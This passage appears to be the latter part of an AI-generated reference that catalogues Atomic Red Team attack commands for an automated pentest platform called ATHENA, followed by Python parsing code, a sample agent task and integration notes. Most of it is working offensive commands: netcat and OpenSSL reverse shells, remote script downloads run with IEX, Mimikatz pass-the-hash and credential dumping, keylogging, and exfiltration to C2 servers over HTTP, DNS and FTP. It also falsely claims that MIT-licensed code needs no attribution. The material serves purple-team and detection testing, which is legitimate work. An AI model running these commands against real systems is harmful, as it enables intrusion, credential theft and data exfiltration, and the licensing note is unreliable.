Cleanup: (process terminates after 5 packets)
```

**Test #4: Windows Internal pktmon (GUID: c67ba807)**

```cmd
# Native Windows packet capture (no tools needed)
pktmon.exe start --etw -f %TEMP%\t1040.etl
TIMEOUT /T 5 >nul 2>&1
pktmon.exe stop

Cleanup:
del %TEMP%\t1040.etl >nul 2>&1
```

---

### 9. T1482 — Domain Trust Discovery

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Discover domain trusts with dsquery (GUID: 4700a710)**

```cmd
dsquery * -filter "(objectClass=trustedDomain)" -attr *
nltest /domain_trusts
netdom query trust

Cleanup: (no persistent state)
```

**Test #2: PowerView Domain Trust Enumeration (GUID: [multiple])**

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
Get-DomainTrust
Get-ForestTrust
```

---

### 10. T1135 — Network Share Discovery

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Network Share Discovery (GUID: [multiple])**

```cmd
net share
net use
net view \\#{computer_name}
wmic share list

Cleanup: (no persistent state)
```

**Test #2: PowerView Share Discovery (GUID: [multiple])**

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
Find-DomainShare -CheckShareAccess
Get-NetShare -ComputerName #{target}
```

---

## TA0008 — Lateral Movement (Top 10)

*Techniques for moving through the environment to reach objectives.*

---

### 1. T1021.001 — Remote Services: RDP

**Platform:** Windows | **Executor:** powershell

**Test #1: RDP to Domain Controller (GUID: 355d4632)**

```powershell
$Server = #{logonserver}
$User = Join-Path #{domain} #{username}
$Password = "#{password}"
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo "RDP connection established"

Cleanup:
$p = Tasklist /svc /fi "IMAGENAME eq mstsc.exe" /fo csv | convertfrom-csv
if(-not ([string]::IsNullOrEmpty($p.PID))) { Stop-Process -Id $p.PID }
```

**Test #2: Change RDP Port to Non-Standard (GUID: [multiple])**

```powershell
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP' -Name PortNumber -Value #{custom_port}

Cleanup:
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP' -Name PortNumber -Value 3389
```

---

### 2. T1021.002 — SMB/Windows Admin Shares

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Map Admin Share (GUID: [multiple])**

```cmd
# Access admin shares for lateral movement
net use \\#{computer_name}\ADMIN$ "#{password}" /user:#{domain}\#{username}
net use \\#{computer_name}\C$ "#{password}" /user:#{domain}\#{username}
net use \\#{computer_name}\IPC$ "#{password}" /user:#{domain}\#{username}

Cleanup:
net use \\#{computer_name}\ADMIN$ /delete
```

**Test: PsExec lateral movement via Admin Share**

```cmd
# PsExec via SMB admin share (SysinternalsSuite)
PsExec.exe \\#{computer_name} -u #{domain}\#{username} -p #{password} cmd.exe
```

---

### 3. T1047 — WMI Lateral Movement

**Platform:** Windows | **Executor:** command_prompt

**Test #1: WMI Remote Process Execution (GUID: 01f4d32f)**

```cmd
wmic /node:"#{target_host}" /user:"#{domain}\#{username}" /password:"#{password}" process call create "#{command_to_execute}"
# Default command: cmd.exe

Cleanup:
wmic /node:"#{target_host}" process where name="#{process_to_terminate}" call terminate
```

**Test: Invoke-WMIMethod PowerShell**

```powershell
$credential = New-Object System.Management.Automation.PSCredential("#{domain}\#{username}", (ConvertTo-SecureString "#{password}" -AsPlainText -Force))
Invoke-WmiMethod -ComputerName #{target_host} -Credential $credential -Class Win32_Process -Name Create -ArgumentList "#{command_to_execute}"
```

---

### 4. T1021.006 — Windows Remote Management (WinRM)

**Platform:** Windows | **Executor:** powershell

**Test #1: Execute command via WinRM (GUID: [multiple])**

```powershell
$credential = New-Object System.Management.Automation.PSCredential("#{username}", (ConvertTo-SecureString "#{password}" -AsPlainText -Force))
Invoke-Command -ComputerName #{target_host} -Credential $credential -ScriptBlock {whoami; hostname; ipconfig /all}
```

**Test #2: WinRM Session Reuse**

```powershell
$session = New-PSSession -ComputerName #{target_host} -Credential $credential
Invoke-Command -Session $session -ScriptBlock {cmd /c "#{command_to_execute}"}
Remove-PSSession $session
```

---

### 5. T1021.003 — DCOM (Distributed Component Object Model)

**Platform:** Windows | **Executor:** powershell

**Test #1: DCOM Lateral Movement via MMC20.Application (GUID: [multiple])**

```powershell
# DCOM lateral movement using MMC20.Application COM object
$obj = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "#{target_host}"))
$obj.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c #{command_to_execute}", "7")
```

---

### 6. T1550.002 — Pass the Hash

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Pass the Hash via Mimikatz sekurlsa (GUID: [multiple])**

```cmd
# Pass NTLM hash to authenticate as user without plaintext password
#{mimikatz_path} "privilege::debug" "sekurlsa::pth /user:#{username} /domain:#{domain} /ntlm:#{ntlm_hash} /run:#{command_to_execute}" "exit"
```

---

### 7. T1550.003 — Pass the Ticket

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Pass the Ticket via Rubeus (GUID: [multiple])**

```cmd
# Inject Kerberos TGT/TGS ticket into current session
#{rubeus_path} ptt /ticket:#{ticket_file}
klist

Cleanup:
klist purge
```

**Test #2: Pass the Ticket via Mimikatz**

```cmd
#{mimikatz_path} "kerberos::ptt #{ticket_file}" "exit"
```

---

### 8. T1021.004 — Remote Services: SSH

**Platform:** Linux, macOS | **Executor:** sh

**Test #1: SSH Lateral Movement (GUID: [multiple])**

```bash
# SSH with key-based auth to remote system
ssh -i #{ssh_key_path} #{username}@#{target_host} "#{command_to_execute}"
# Default command: id; hostname; uname -a

Cleanup: (session terminates)
```

---

### 9. T1072 — Software Deployment Tools

**Platform:** Windows | **Executor:** command_prompt

**Test #1: Abuse Remote Management Tool (GUID: [multiple])**

```powershell
# Simulate abuse of RMM tool (SCCM, PDQ, Ansible, etc.)
# Check for available management agents
Get-Service | Where-Object {$_.DisplayName -match "SCCM|PDQ|Ansible|Salt|Puppet|Chef"}
# Execute via discovered tool's deployment mechanism
```

---

### 10. T1570 — Lateral Tool Transfer

**Platform:** Windows | **Executor:** powershell

**Test #1: SMB over QUIC File Transfer (GUID: d8d13303)**

```powershell
# Transfer tools between compromised systems
New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck $true
Copy-Item "#{local_file}" "#{remote_path}"

Cleanup:
Remove-SmbMapping -RemotePath '#{remote_path}' -Force -ErrorAction Ignore
```

**Test: Traditional SMB File Copy**

```cmd
copy #{source_file} \\#{target_host}\ADMIN$\#{dest_file}
```

---

## TA0009 — Collection (Top 5)

*Techniques for gathering data of interest.*

---

### 1. T1113 — Screen Capture

**Platform:** Windows | **Executor:** powershell

**Test #1: Screen Capture via PowerShell (GUID: 3c898f62)**

```powershell
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
$bitmap.Save("#{output_file}")

Cleanup:
Remove-Item "#{output_file}" -Force -ErrorAction Ignore
```

---

### 2. T1056.001 — Keylogging

**Platform:** Windows | **Executor:** powershell

**Test #1: Keylogging via PowerShell (GUID: [multiple])**

```powershell
# PowerShell keylogger using SetWindowsHookEx
Set-Location $env:TEMP
# Download keylogger script or implement inline
IEX (New-Object Net.WebClient).DownloadString("#{keylogger_url}")
# Default: outputs to %TEMP%\key_capture.txt

Cleanup:
Remove-Item "$env:TEMP\key_capture.txt" -Force -ErrorAction Ignore
```

---

### 3. T1115 — Clipboard Data

**Platform:** Windows | **Executor:** powershell

**Test #1: Collect Clipboard Data (GUID: [multiple])**

```powershell
Add-Type -AssemblyName PresentationCore
[Windows.Clipboard]::GetText()
# Or monitor clipboard continuously
while($true) {
  $data = [Windows.Clipboard]::GetText()
  if ($data) { Add-Content -Path "#{output_file}" -Value $data }
  Start-Sleep -Seconds 1
}

Cleanup:
Remove-Item "#{output_file}" -Force -ErrorAction Ignore
```

---

### 4. T1039 — Data from Network Shared Drive

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Collect Data from Network Shares (GUID: [multiple])**

```powershell
# Enumerate and collect data from accessible shares
$shares = @("\\#{server}\share1", "\\#{server}\share2")
foreach ($share in $shares) {
  Get-ChildItem -Path $share -Recurse -ErrorAction SilentlyContinue |
    Where-Object {$_.Extension -in @(".doc",".docx",".xls",".xlsx",".pdf",".txt")} |
    Copy-Item -Destination "#{staging_directory}" -ErrorAction SilentlyContinue
}

Cleanup:
Remove-Item "#{staging_directory}" -Recurse -Force -ErrorAction Ignore
```

---

### 5. T1560.001 — Archive via Utility

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Compress Data for Exfiltration (GUID: [multiple])**

```powershell
# Compress staged files before exfiltration
Compress-Archive -Path "#{input_file_folder}" -DestinationPath "#{output_file_path}" -Force

# Using 7zip (if available)
7z a "#{output_file_path}.7z" "#{input_file_folder}" -p"#{encryption_password}"

Cleanup:
Remove-Item "#{output_file_path}" -Force -ErrorAction Ignore
```

---

## TA0010 — Exfiltration (Top 5)

*Techniques for stealing data from target networks.*

---

### 1. T1041 — Exfiltration Over C2 Channel

**Platform:** Windows | **Executor:** powershell

**Test #1: Exfiltration over HTTP (GUID: [multiple])**

```powershell
# Exfiltrate data via HTTP POST to C2 server
$data = Get-Content "#{file_to_exfil}" | ConvertTo-Json
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
$encoded = [Convert]::ToBase64String($bytes)
Invoke-WebRequest -Method POST -Uri "#{c2_server}/upload" -Body $encoded -ContentType "application/json"

Cleanup: (no local state — file already sent)
```

---

### 2. T1048.002 — Exfiltration Over Alternative Protocol: Non-Application Layer Protocol

**Platform:** Linux | **Executor:** sh

**Test #1: DNS Exfiltration via dnscat2 (GUID: [multiple])**

```bash
# Exfiltrate data via DNS queries (covert channel)
# Data encoded in subdomain labels
data=$(cat "#{file_to_exfil}" | base64 | tr '+/=' '-_.')
echo $data | while read chunk; do
  dig $chunk.#{exfil_domain} @#{dns_server} > /dev/null 2>&1
done

Cleanup:
rm /tmp/exfil_* 2>/dev/null
```

---

### 3. T1567.002 — Exfiltration to Cloud Storage

**Platform:** Windows | **Executor:** powershell

**Test #1: Upload to Google Drive via API (GUID: [multiple])**

```powershell
# Exfiltrate to Google Drive
$filePath = "#{file_to_exfil}"
$accessToken = "#{google_drive_token}"
$headers = @{ Authorization = "Bearer $accessToken" }
$metadata = @{ name = (Split-Path $filePath -Leaf) } | ConvertTo-Json
Invoke-RestMethod -Method Post -Uri "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart" -Headers $headers -InFile $filePath

Cleanup: (data already exfiltrated)
```

---

### 4. T1048.003 — Exfiltration Over Unencrypted Protocol (FTP)

**Platform:** Linux | **Executor:** sh

**Test #1: FTP Exfiltration (GUID: [multiple])**

```bash
# Exfiltrate file via FTP to attacker-controlled server
curl -T "#{file_to_exfil}" ftp://#{ftp_server}/#{remote_path} --user "#{ftp_user}:#{ftp_password}"

Cleanup: (data already exfiltrated)
```

---

### 5. T1020 — Automated Exfiltration

**Platform:** Windows | **Executor:** powershell

**Test #1: Automated Data Collection and Exfiltration (GUID: [multiple])**

```powershell
# Continuous automated exfiltration
while ($true) {
  # Collect recent files
  $newFiles = Get-ChildItem "#{monitor_path}" -Recurse -File |
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddMinutes(-5)}

  foreach ($file in $newFiles) {
    $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($file.FullName))
    Invoke-RestMethod -Method POST -Uri "#{c2_server}" -Body @{data=$encoded;filename=$file.Name}
  }
  Start-Sleep -Seconds 300
}
```

---

## TA0011 — Command and Control (Top 10)

*Techniques for communicating with compromised systems.*

---

### 1. T1071.001 — Application Layer Protocol: Web Protocols (HTTP/HTTPS)

**Platform:** Windows | **Executor:** powershell

**Test #1: Malicious User Agents via PowerShell (GUID: [multiple])**

```powershell
# Simulate C2 beaconing with malicious/APT user agents
$c2Server = "#{c2_server}"
$userAgents = @(
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENUSMSE)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"  # Fin7
)
foreach ($ua in $userAgents) {
  Invoke-WebRequest -Uri $c2Server -UserAgent $ua -UseBasicParsing
}
```

---

### 2. T1071.004 — Application Layer Protocol: DNS

**Platform:** Windows, Linux | **Executor:** command_prompt

**Test #1: DNS C2 Beaconing via nslookup (GUID: [multiple])**

```cmd
# DNS beaconing — encode data in subdomain queries
nslookup #{encoded_data}.#{c2_domain}
for /l %i in (1,1,#{count}) do nslookup #{subdomain}%i.#{c2_domain}
```

---

### 3. T1572 — Protocol Tunneling (DNS over HTTPS)

**Platform:** Windows | **Executor:** powershell

**Test #1: DNS over HTTPS Large Query Volume (GUID: ae9ef4b0)**

```powershell
# DoH beaconing — trigger threshold-based detection
for ($i = 0; $i -le #{query_volume}; $i++) {
  $uri = "#{doh_server}?name=#{subdomain}$i.#{domain}&type=#{query_type}"
  Invoke-WebRequest -Uri $uri -UseBasicParsing -Method Get
  Start-Sleep -Milliseconds 100
}
# Default: 1000 queries to 8.8.8.8/resolve
```

**Test #4: ngrok Tunnel (GUID: [multiple])**

```cmd
# Establish reverse tunnel via ngrok (C2 over legitimate service)
ngrok tcp #{local_port}
```

**Test #7: Cloudflare Tunnels (Linux/macOS)**

```bash
# Cloudflare tunnel for C2 egress
cloudflared tunnel --url localhost:#{local_port}
```

---

### 4. T1095 — Non-Application Layer Protocol (ICMP C2)

**Platform:** Windows | **Executor:** command_prompt

**Test #1: ICMP C2 (GUID: 0268e63c)**

```
Description: Attempt to start C2 Session using ICMP.
Requires external ICMP C2 listener (e.g., BlackHills ICMP-C2 setup).

Reference: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
Platform: Windows
Elevation: Not required

Setup listener first, then run:
ping #{server}  # (or PowerShell-based ICMP exfil code)
```

**Test #2: Netcat C2 (GUID: [multiple])**

```bash
# TCP/UDP raw socket C2
nc -e /bin/bash #{c2_server} #{port}  # Linux reverse shell
# Windows:
nc.exe #{c2_server} #{port} -e cmd.exe
```

---

### 5. T1090.003 — Proxy: Multi-hop Proxy

**Platform:** Linux | **Executor:** sh

**Test #1: Multi-hop SSH Proxy Tunnel (GUID: [multiple])**

```bash
# Chain proxies through compromised hosts
ssh -D #{socks_port} -N -f #{user}@#{pivot_host1}
# Then proxy through second host
ssh -o "ProxyCommand=nc -X 5 -x localhost:#{socks_port} %h %p" #{user}@#{pivot_host2}
```

---

### 6. T1105 — Ingress Tool Transfer

**Platform:** Windows | **Executor:** command_prompt / powershell

**Test #1: Transfer via certutil (GUID: [multiple])**

```cmd
# Download file using certutil (LOLBin)
certutil.exe -urlcache -split -f "#{remote_file_url}" "#{local_destination}"

Cleanup:
del "#{local_destination}" >nul 2>&1
certutil.exe -urlcache -split -f "#{remote_file_url}" delete
```

**Test #2: Transfer via PowerShell (GUID: [multiple])**

```powershell
(New-Object Net.WebClient).DownloadFile("#{remote_url}", "#{local_path}")
# Or:
Invoke-WebRequest "#{remote_url}" -OutFile "#{local_path}"

Cleanup:
Remove-Item "#{local_path}" -Force -ErrorAction Ignore
```

---

### 7. T1219 — Remote Access Tools

**Platform:** Windows | **Executor:** powershell

**Test #1: Install ngrok for Remote Access (GUID: [multiple])**

```powershell
# Download and run ngrok as backdoor RAT
Invoke-WebRequest "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip" -OutFile "$env:TEMP\ngrok.zip"
Expand-Archive -Path "$env:TEMP\ngrok.zip" -DestinationPath "$env:TEMP\ngrok"
& "$env:TEMP\ngrok\ngrok.exe" tcp 3389

Cleanup:
Stop-Process -Name "ngrok" -Force -ErrorAction Ignore
Remove-Item "$env:TEMP\ngrok*" -Recurse -Force -ErrorAction Ignore
```

---

### 8. T1132.001 — Data Encoding: Standard Encoding (Base64)

**Platform:** Windows | **Executor:** powershell

**Test #1: Base64 Encoded C2 Communications (GUID: [multiple])**

```powershell
# Encode C2 commands in base64 to evade string-based detection
$command = "whoami; hostname; ipconfig /all"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -EncodedCommand $encoded

Cleanup: (no persistent state)
```

---

### 9. T1571 — Non-Standard Port

**Platform:** Windows | **Executor:** powershell

**Test #1: C2 on Non-Standard Port (GUID: [multiple])**

```powershell
# C2 communications over non-standard ports (e.g., 8080, 8443, 4444, 9999)
Invoke-WebRequest -Uri "http://#{c2_server}:#{non_standard_port}/beacon" -UseBasicParsing
# Or raw socket:
$tcp = New-Object System.Net.Sockets.TcpClient("#{c2_server}", #{non_standard_port})
```

---

### 10. T1573 — Encrypted Channel

**Platform:** Linux | **Executor:** sh

**Test #1: OpenSSL C2 Encrypted Channel (GUID: [multiple])**

```bash
# Establish encrypted reverse shell via OpenSSL
# On attacker (listener):
openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port #{port} -naccept 1 -pty

# On victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect #{c2_server}:#{port} > /tmp/s; rm /tmp/s

Cleanup:
rm /tmp/s /tmp/key.pem /tmp/cert.pem 2>/dev/null
```

---

## ATHENA Integration Notes

### How ATHENA Should Parse and Execute Atomics

#### 1. YAML Parser Architecture

```python
import yaml
from pathlib import Path
from dataclasses import dataclass
from typing import Optional, List

@dataclass
class AtomicTest:
    name: str
    guid: str                          # auto_generated_guid
    description: str
    platforms: List[str]               # supported_platforms
    executor: str                      # executor.name
    elevation_required: bool           # executor.elevation_required
    command: str                       # executor.command
    cleanup_command: Optional[str]     # executor.cleanup_command
    input_arguments: dict              # input_arguments
    dependencies: list                 # dependencies

def parse_atomic_file(yaml_path: Path) -> List[AtomicTest]:
    with open(yaml_path) as f:
        data = yaml.safe_load(f)

    technique_id = data['attack_technique']
    tests = []

    for test in data.get('atomic_tests', []):
        executor = test.get('executor', {})
        tests.append(AtomicTest(
            name=test['name'],
            guid=test.get('auto_generated_guid', ''),
            description=test.get('description', ''),
            platforms=test.get('supported_platforms', []),
            executor=executor.get('name', 'command_prompt'),
            elevation_required=executor.get('elevation_required', False),
            command=executor.get('command', ''),
            cleanup_command=executor.get('cleanup_command'),
            input_arguments=test.get('input_arguments', {}),
            dependencies=test.get('dependencies', [])
        ))
    return tests

def substitute_args(command: str, input_args: dict, overrides: dict = None) -> str:
    """Substitute #{variable} with actual values"""
    args = {}
    # Start with defaults
    for name, spec in input_args.items():
        args[name] = spec.get('default', '')
    # Apply operator overrides
    if overrides:
        args.update(overrides)
    # Substitute
    for name, value in args.items():
        command = command.replace(f'#{{{name}}}', str(value))
    return command
```

#### 2. ATHENA Agent Command Structure

When ATHENA dispatches an atomic test to a Kali agent:

```json
{
  "task_type": "atomic_test",
  "technique_id": "T1059.001",
  "test_guid": "f3132740-55bc-48c4-bcc0-758a459cd027",
  "test_name": "Mimikatz",
  "target_host": "192.168.1.10",
  "target_platform": "windows",
  "executor": "command_prompt",
  "elevation_required": true,
  "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.99/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
  "cleanup_command": null,
  "operator_approved": true,
  "session_id": "athena-session-abc123"
}
```

#### 3. Technique Selection by Phase

ATHENA maps pentest phases to ATT&CK tactics:

| Pentest Phase | Primary Tactics | Key Techniques |
|---------------|-----------------|----------------|
| Reconnaissance | TA0007 | T1046, T1087, T1082 |
| Initial Exploitation | TA0001, TA0002 | T1190, T1059.001, T1047 |
| Post-Exploitation | TA0003, TA0004 | T1547, T1548.002, T1055 |
| Credential Harvesting | TA0006 | T1003.001, T1558.003, T1003.006 |
| Lateral Movement | TA0008 | T1021, T1550.002, T1021.006 |
| Data Collection | TA0009 | T1113, T1056.001, T1560 |
| Exfiltration | TA0010 | T1041, T1048 |

#### 4. Platform Filtering

```python
def filter_atomics_for_platform(atomics: List[AtomicTest], platform: str) -> List[AtomicTest]:
    """Filter tests to only include those supported on the target platform"""
    return [a for a in atomics if platform.lower() in [p.lower() for p in a.platforms]]

# Usage in ATHENA
windows_tests = filter_atomics_for_platform(all_tests, "windows")
linux_tests = filter_atomics_for_platform(all_tests, "linux")
```

#### 5. HITL (Human-in-the-Loop) Integration

Atomic tests with `elevation_required: true` or destructive operations should trigger ATHENA's HITL approval before execution:

```python
HITL_REQUIRED_TECHNIQUES = {
    "T1003.001",  # LSASS dump
    "T1003.006",  # DCSync
    "T1558.001",  # Golden Ticket
    "T1548.002",  # UAC Bypass
    "T1562.001",  # Disable AV
    "T1070.001",  # Clear Event Logs
    "T1485",      # Data Destruction
}

def requires_hitl_approval(technique_id: str, test: AtomicTest) -> bool:
    return (
        technique_id in HITL_REQUIRED_TECHNIQUES or
        test.elevation_required or
        "delete" in test.command.lower() or
        "format" in test.command.lower()
    )
```

---

## Post-Exploitation Validation Workflow

### Using Atomics to Validate Exploitation Success

After exploiting a vulnerability, use atomics to verify the exploitation has achieved its objective and validate the pentest findings are real and reproducible.

#### Validation Pattern

```powershell
# Step 1: Confirm current user/privileges
Invoke-AtomicTest T1033    # System Owner/User Discovery
Invoke-AtomicTest T1082    # System Information Discovery

# Step 2: Validate credential access is working
Invoke-AtomicTest T1003.001 -CheckPrereqs -TestNumbers 22  # comsvcs LSASS dump
Invoke-AtomicTest T1558.003 -TestNumbers 1                  # Kerberoasting

# Step 3: Confirm lateral movement capability
Invoke-AtomicTest T1021.001 -TestNumbers 1    # RDP to DC
Invoke-AtomicTest T1021.002 -TestNumbers 1    # Admin share access

# Step 4: Confirm persistence is working
Invoke-AtomicTest T1547.001 -TestNumbers 1    # Registry run key
# Reboot, verify payload executes

# Step 5: Document all successful atomics for report
$results = @{}
$techniques = @("T1003.001", "T1558.003", "T1021.001", "T1547.001")
foreach ($t in $techniques) {
  $result = Invoke-AtomicTest $t -ShowDetails 2>&1
  $results[$t] = $result
}
$results | ConvertTo-Json | Out-File "pentest_atomic_evidence.json"
```

#### Atomic Runner for Continuous Validation

```powershell
# Set up Atomic Runner for automated continuous testing (purple team mode)
Install-Module Invoke-AtomicRedTeam
Import-Module Invoke-AtomicRedTeam

# Configure schedule CSV with techniques to test
Invoke-SetupAtomicRunner
Invoke-GenerateNewSchedule

# The runner appends GUID to hostname before each test:
# Enables SIEM to correlate detection gaps per atomic GUID
Invoke-AtomicRunner
```

#### Evidence Collection Post-Atomic

```powershell
# Collect artifacts after running atomics
function Collect-AtomicEvidence {
  param($TechniqueId, $TestGuid)

  $evidence = @{
    TechniqueId = $TechniqueId
    TestGuid = $TestGuid
    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    User = whoami
    Hostname = hostname
    EventLogs = Get-WinEvent -FilterHashTable @{LogName="Security"; StartTime=(Get-Date).AddMinutes(-5)} -ErrorAction SilentlyContinue
  }

  $evidence | ConvertTo-Json | Out-File "$env:TEMP\atomic_evidence_$TechniqueId.json"
}
```

---

## Quick Reference: Technique Count by Tactic

| Tactic | ID | Techniques with Atomics | Top Pentest Value |
|--------|-----|------------------------|-------------------|
| Initial Access | TA0001 | ~15 | Phishing, External Remote Services |
| Execution | TA0002 | ~35 | PowerShell, WMI, Scheduled Tasks |
| Persistence | TA0003 | ~55 | Registry Run Keys, WMI Events, Services |
| Privilege Escalation | TA0004 | ~30 | UAC Bypass, Token Manipulation |
| Defense Evasion | TA0005 | ~60 | AMSI Bypass, Process Injection, Log Clearing |
| Credential Access | TA0006 | ~35 | LSASS, DCSync, Kerberoasting |
| Discovery | TA0007 | ~35 | Network Scan, AD Enum, System Info |
| Lateral Movement | TA0008 | ~15 | RDP, WMI, SMB, Pass-the-Hash |
| Collection | TA0009 | ~20 | Screen Capture, Keylog, Archive |
| Exfiltration | TA0010 | ~10 | DNS Exfil, HTTP, Cloud Storage |
| Command & Control | TA0011 | ~25 | Web, DNS, Tunneling, ICMP |
| **TOTAL** | | **~335 techniques** | **900+ individual tests** |

---

## Notes for ATHENA Development

1. **GUID as Stable Identifier** — Use `auto_generated_guid` (not test index) to select specific tests. Test order may change between versions.

2. **PathToAtomicsFolder Special Variable** — This resolves to the local atomics directory. In ATHENA's remote execution context, replace with the appropriate UNC/absolute path on the target or drop the atomics folder first via T1105.

3. **Dependency Management** — Always run `-CheckPrereqs` before execution. ATHENA should auto-run `-GetPrereqs` when dependencies are missing and operator has approved.

4. **Elevation Required Flag** — Tests marked `elevation_required: true` require admin/SYSTEM. ATHENA should only dispatch these after confirming privilege level via T1033/T1082.

5. **Cleanup is Critical** — Always execute cleanup commands in controlled pentest environments to avoid lingering artifacts that could affect later tests or the client's production environment.

6. **Platform Matrix** — Maintain a platform-capability matrix in ATHENA's Neo4j graph: node for each target (with OS property), edges to supported atomics.

7. **Evidence Correlation** — The Atomic Runner appends test GUID to hostname. In ATHENA, correlate this hostname pattern in SIEM/EDR data to build detection gap analysis automatically.

8. **MIT License Compliance** — Atomic Red Team is MIT licensed. ATHENA can bundle, modify, and commercialize without restriction. Attribution recommended but not required.

---

*End of Reference Document*

*Generated by ZeroK Labs Researcher Agent — 2026-02-26*
*Data sourced from github.com/redcanaryco/atomic-red-team, atomicredteam.io, github.com/redcanaryco/invoke-atomicredteam*
